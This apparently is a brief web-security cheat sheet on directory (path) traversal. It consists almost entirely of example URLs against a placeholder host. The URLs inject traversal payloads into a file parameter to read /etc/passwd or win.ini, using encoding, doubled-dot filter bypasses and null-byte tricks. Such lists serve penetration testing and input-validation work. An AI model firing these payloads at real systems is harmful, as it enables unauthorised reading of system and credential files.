---
title: Directory Traversal Cheat Sheet
desc:  Examples of Directory Traversal. It’s also known as Path Traversal. 
tags: [DirectoryTraversal, Web]
alts: []
website:
render_with_liquid: false
---

```
https://vulnerable.com/image?file=index.php
https://vulnerable.com/image?file=index.html
https://vulnerable.com/image?file=/etc/passwd
https://vulnerable.com/image?file=../../../etc/passwd
https://vulnerable.com/image?file=....//....//....//etc/passwd
https://vulnerable.com/image?file=..%252f..%252f..%252fetc/passwd
https://vulenrable.com/image?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
https://vulnerable.com/image?file=/var/www/images/../../../etc/passwd
https://vulnerable.com/image?file=/etc/passwd%00.png
https://vulnerable.com/image?file=../../../etc/passwd%00.png
https://vulnerable.com/image?file=....//....//....//etc/passwd%00.png
https://vulnerable.com/image?file=..%252f..%252f..%252fetc/passwd%00.png
https://vulnerable.com/image?file=/var/www/images/../../../etc/passwd%00.png

https://vulnerable.com/image?file=..\..\..\windows\win.ini
```